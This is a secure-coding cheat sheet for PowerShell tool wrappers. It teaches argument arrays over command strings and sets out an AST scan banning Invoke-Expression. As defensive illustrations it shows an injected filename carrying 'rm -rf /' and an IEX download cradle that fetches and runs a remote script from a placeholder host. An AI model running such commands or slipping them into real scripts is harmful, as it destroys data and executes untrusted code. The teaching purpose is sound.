---
template: cheatsheet.html
hide:
  - navigation
  - toc
---

# Cheat sheet — Driving Tools & External Processes Safely

*Companion to [Module 05 — Driving Tools & External Processes Safely](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

## The one rule: argument array, never a command string

```powershell
# SAFE — each element is a discrete argv token; no shell re-parses it.
& $exe $arg1 $arg2                       # native call operator, discrete args
& $exe @argArray                         # splat an array of args
Start-Process -FilePath $exe -ArgumentList @($arg1, $arg2) -Wait -NoNewWindow

# UNSAFE — you built a command STRING; metacharacters in data become syntax.
Invoke-Expression "$exe $arg"            # command injection. BANNED in Vigil.
& "$exe $arg"                            # same wound: one string, re-parsed
cmd /c "$exe $arg"                       # hands cmd.exe your data to re-tokenize
```

The array passes `arg1`, `arg2` to the process as **separate, already-split** strings. `; rm -rf`,
`$(...)`, backticks, spaces, quotes inside an argument are just *bytes in that one argument*. The string
form throws the tokenization away and lets a fresh interpreter treat your data as code.

## `Start-Process` — the capture-everything pattern

```powershell
$out = New-TemporaryFile; $err = New-TemporaryFile
$p = Start-Process -FilePath $exe -ArgumentList @($arg1, $arg2) `
    -Wait -NoNewWindow -PassThru `
    -RedirectStandardOutput $out -RedirectStandardError $err
[pscustomobject]@{
    Tool     = $exe
    ExitCode = $p.ExitCode
    Success  = ($p.ExitCode -eq 0)
    StdOut   = Get-Content $out -Raw
    StdErr   = Get-Content $err -Raw
}
Remove-Item $out, $err
```

`-PassThru` returns the process so you can read `.ExitCode`; `-Redirect*` capture the streams separately.
**Always check the exit code** — a tool that failed and a tool that found nothing look identical if you
only read stdout.

> **Gotcha:** on .NET, `Start-Process -ArgumentList` re-joins the list into one string it then re-splits
> on whitespace — so an argument with a legitimate space (`"my file.txt"`) can arrive split. Both forms
> keep you injection-safe (no shell is involved), but for faithful argv passing prefer the **native call
> operator** below. `Vigil`'s `Invoke-VigilTool` uses `& @args` for exactly this reason.

## Native call operator + `$LASTEXITCODE`

```powershell
$stdout = & $exe @argArray 2>$null       # call operator captures stdout to the pipeline
$code   = $LASTEXITCODE                   # native exit code of the LAST external call
[pscustomobject]@{ ExitCode = $code; Success = ($code -eq 0); Lines = $stdout }
```

Use `&`+`$LASTEXITCODE` for quick stdout capture; use `Start-Process` when you need stderr separated,
`-Wait`, a timeout, or window control.

## Why `Invoke-Expression` is dangerous

```powershell
# iex runs a STRING as PowerShell SOURCE in your session.
$path = 'evil.txt; rm -rf /'             # attacker-controlled filename from telemetry
Invoke-Expression "scan $path"           # -> runs `scan evil.txt` THEN `rm -rf /`
Start-Process scan -ArgumentList @($path) # -> scans one file literally named "evil.txt; rm -rf /"
```

The download cradle (ATT&CK **T1059.001**) is the same wound weaponized:
`IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')` — a network string, executed in memory,
no file on disk. If you know the command at author-time, call it directly. If you're building it from
data, you've built an injection. **`Invoke-Expression` is banned in `Vigil` — enforce it, don't remember it.**

## The AST scan — the review gate (not a grep)

```powershell
using namespace System.Management.Automation.Language

function Test-VigilNoInvokeExpression {
    param([string]$Path)
    $banned = @('Invoke-Expression', 'iex')
    $bad = foreach ($f in Get-ChildItem $Path -Recurse -Filter *.ps1) {
        $ast = [Parser]::ParseFile($f.FullName, [ref]$null, [ref]$null)
        $ast.FindAll({ param($n)
            $n -is [CommandAst] -and
            $banned -contains $n.GetCommandName()
        }, $true) | ForEach-Object {
            [pscustomobject]@{ File = $f.Name; Line = $_.Extent.StartLineNumber }
        }
    }
    if ($bad) { $bad | Format-Table | Out-String | Write-Output; throw 'Invoke-Expression found.' }
}
```

`FindAll` walks the parsed **syntax tree**, so it matches a real `Invoke-Expression` *command
invocation* — not the word appearing in a comment or a string. `GetCommandName()` also catches the `iex`
alias. Grep can't tell code from a comment; the AST can.

## Robust output parsing — text in, objects out

```powershell
# Split a `sha256sum`-style "<hash>  <file>" line into fields; don't return the blob.
$result = & $hashTool @($file)
$result | ForEach-Object {
    $hash, $name = $_ -split '\s+', 2
    [pscustomobject]@{ File = $name; Sha256 = $hash }
}
# native JSON tools: parse, then VALIDATE the shape before you trust it (Module 07's discipline).
$obj = & $tool @('--json', $target) | ConvertFrom-Json
```

Return named fields, not stdout. A wrapper that emits `[pscustomobject]` is one your detection logic can
reason about; one that emits a string is one the next module has to re-parse.

## The gate (what `make demo` runs)

```text
1. AST scan   → Test-VigilNoInvokeExpression ./Vigil   (fails on any iex/Invoke-Expression node)
2. Analyzer   → Invoke-ScriptAnalyzer ./Vigil -Settings ... (PSAvoidUsingInvokeExpression especially)
3. Pester     → feed a hostile arg; assert the payload did NOT execute; assert ExitCode is real
```

Three layers: the AST scan is the hard ban, `PSScriptAnalyzer` is the style/rule net, and the injection
`Pester` test is the *proof* the wrapper treats `; rm -rf` as data.
